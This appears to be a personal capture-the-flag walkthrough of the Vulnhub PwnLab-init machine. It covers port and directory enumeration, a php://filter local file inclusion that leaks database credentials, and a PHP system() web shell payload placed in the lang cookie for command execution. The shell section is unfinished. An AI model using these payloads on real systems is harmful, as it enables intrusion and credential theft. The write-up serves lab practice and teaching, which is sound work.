# Pwnlab-init

Author: Vulnhub
Difficulty: 3
Key takeaway: $_COOKIE["lang"] implies that you can run commands by altering the Cookie property in request header (lang?=<?php echo system($_GET["cmd"]);?>)
Tags: LFI
Type: Linux

# Enumeration

- portscan

```bash
nmap -p80,111,3306,44640 -sV -sC -T4 -Pn -oA 10.0.2.7 10.0.2.7
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-02 04:02 EDT
Nmap scan report for 10.0.2.7
Host is up (0.0023s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34512/udp   status
|   100024  1          44640/tcp   status
|   100024  1          52120/tcp6  status
|_  100024  1          58439/udp6  status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 41
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, Support41Auth, ConnectWithDatabase, Speaks41ProtocolOld, FoundRows, DontAllowDatabaseTableColumn, SupportsTransactions, SupportsLoadDataLocal, ODBCClient, IgnoreSigpipes, LongColumnFlag, InteractiveClient, SupportsCompression, Speaks41ProtocolNew, LongPassword, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: &n{Br;m7dt<l-7l?2|>_
|_  Auth Plugin Name: mysql_native_password
44640/tcp open  status  1 (RPC #100024)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.58 seconds
```

- gobuster dir enumeration

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.7
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2021/10/02 04:07:59 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 305] [--> http://10.0.2.7/images/]
/index.php            (Status: 200) [Size: 332]                              
/upload.php           (Status: 200) [Size: 19]                               
/upload               (Status: 301) [Size: 305] [--> http://10.0.2.7/upload/]
/login.php            (Status: 200) [Size: 250]                              
/config.php           (Status: 200) [Size: 0]                                
/server-status        (Status: 403) [Size: 296]                              
                                                                             
===============================================================
2021/10/02 04:11:54 Finished
```

# Initial Access

Found LFI vulnerability

```bash
# http://pwnlab.vuln/index.php?page=login
http://pwnlab.vuln/index.php?page=php://filter/convert.base64-encode/resource=config
```

this gives us a hash which when cracked gives us credentials for the database

```php
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?base64: invalid input
```

enumerated the sql database 

```sql
MySQL [Users]> SELECT * FROM users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
```

these were all base64 hashes 

```bash
# to decode this
echo "hash" | base64 -d 
# these gave us some passwords that helped with logging in as kane and kent
```

Found another LFI by using 

```bash
php://filter/convert.base64-encode/resource=index
php://filter/convert.base64-encode/resource=login
php://filter/convert.base64-encode/resource=upload
```

```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
        include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
```

when sending the request change the Cookie field in the headers to lang?=<?php echo system($_GET["cmd"]);?>

this will allow us to use cmd=id commands and obtain a reverse shell

# Privilege Escalation

# Notes

-